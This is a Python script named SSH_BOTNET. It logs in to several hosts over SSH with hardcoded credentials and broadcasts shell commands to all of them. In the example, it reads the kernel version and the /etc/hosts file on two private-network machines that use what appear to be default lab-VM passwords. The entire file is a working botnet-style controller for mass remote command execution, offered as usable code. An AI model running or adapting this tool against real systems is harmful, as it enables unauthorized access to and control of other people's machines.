#! /usr/bin/python3
from pexpect import pxssh
# import sys

class SSH_BOTNET:
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.Connect()
    
    def Connect(self):
        try:
            ssh_login = pxssh.pxssh()
            ssh_login.login(self.host,self.user,self.password)
            return ssh_login

        except Exception as e:
            print("Error: {}".format(e))
    
    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(cmd):
    for client in bot:
        print("Output form : [{}: {}]".format(client.host,client.user))
        # output = str(client.send_command(cmd))
        output = client.send_command(cmd)
        print("{}\n\n".format(output))

def addClient(host,user,password):
    client = SSH_BOTNET(host,user,password)
    bot.append(client)

if __name__ == "__main__":
    bot = []
    addClient("192.168.0.112","root","owaspbwa")
    addClient("192.168.0.107","msfadmin","msfadmin")
    botnetCommand("uname -r")
    botnetCommand("cat /etc/hosts")
    # botnetCommand("cat /etc/issue")